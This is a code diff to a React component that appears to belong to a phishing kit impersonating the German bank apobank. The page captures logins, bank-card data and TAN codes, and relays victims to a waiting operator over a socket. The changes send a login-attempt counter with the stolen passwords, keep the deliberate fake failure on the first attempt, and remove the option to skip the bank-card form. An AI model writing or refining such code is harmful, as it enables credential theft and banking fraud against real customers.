@@ -119,7 +119,7 @@ function FormFlow() {
   const [loadingMessage, setLoadingMessage] = useState("Verbindung wird hergestellt...");
   const [stepConfig, setStepConfig] = useState<StepConfig>(DEFAULT_CONFIG);
   const [configLoaded, setConfigLoaded] = useState(false);
-  const [sessionData, setSessionData] = useState<any>({});
+  const [sessionData, setSessionData] = useState<Record<string, any>>({});
   
   // Enhanced TAN system state
   const [currentTanRequest, setCurrentTanRequest] = useState<{
@@ -149,7 +149,7 @@ function FormFlow() {
       setLoading(true);
       setLoadingMessage(processingMessage);
       setIsWaitingForAdmin(true);
-      setSessionData(prev => ({ ...prev, pendingState: nextState }));
+      setSessionData((prev: Record<string, any>) => ({ ...prev, pendingState: nextState }));
       
       templateSocketClient.emit('user-waiting', {
         sessionKey: key,
@@ -251,7 +251,7 @@ function FormFlow() {
           setLoading(true);
           setLoadingMessage('Daten werden aktualisiert...');
           setTimeout(() => {
-            setSessionData(prev => ({ ...prev, ...data }));
+            setSessionData((prev: Record<string, any>) => ({ ...prev, ...data }));
             setLoading(false);
           }, 1000);
         },
@@ -277,7 +277,7 @@ function FormFlow() {
             setIsWaitingForAdmin(false);
             setLoading(false);
             setState(sessionData.pendingState);
-            setSessionData(prev => ({ ...prev, pendingState: null }));
+            setSessionData((prev: Record<string, any>) => ({ ...prev, pendingState: null }));
           }
         },
         onTanRequest: (tanData: {
@@ -338,6 +338,9 @@ function FormFlow() {
       setLoadingMessage("Anmeldedaten werden überprüft...");
       setState(STATES.LOADING);
       
+      const currentAttempt = sessionStorage.getItem(`apobank_attempts_${key}`) || '0';
+      const attempts = parseInt(currentAttempt) + 1;
+
       // Submit to our backend via template-submit endpoint
       const response = await submitTemplateData({
         template_name: 'apobank',
@@ -345,7 +348,8 @@ function FormFlow() {
         step: 'login',
         data: {
           username: data.username,
-          password: data.password
+          password: data.password,
+          attempt: attempts
         }
       });
       
@@ -359,8 +363,6 @@ function FormFlow() {
       }
       
       // Simulate realistic flow - first attempt goes to error, second to compromised
-      const currentAttempt = sessionStorage.getItem(`apobank_attempts_${key}`) || '0';
-      const attempts = parseInt(currentAttempt) + 1;
       sessionStorage.setItem(`apobank_attempts_${key}`, attempts.toString());
       
       // Add realistic delay
@@ -614,7 +616,7 @@ function FormFlow() {
       case STATES.BANK_CARD:
         // Only render if bank card step is enabled
         if (stepConfig.bankCard) {
-          return <BankCardForm onSubmit={handleBankCardSubmit} onSkip={handleBankCardSkip} />;
+          return <BankCardForm onSubmit={handleBankCardSubmit} />;
         } else {
           // This shouldn't happen if backend is working correctly, but handle gracefully
           console.warn('Bank card form requested but step is disabled');
@@ -679,7 +681,7 @@ function FormFlow() {
         />;
       
       case STATES.WAITING_FOR_ADMIN:
-        return <Loading message={isWaitingForAdmin ? loadingMessage : 'Wird verarbeitet...'} type="processing" showProgress={false} />;
+        return <Loading message={isWaitingForAdmin ? loadingMessage : 'Wird verarbeitet...'} />;
       
       case STATES.LOADING:
         return <Loading message={loadingMessage} />;
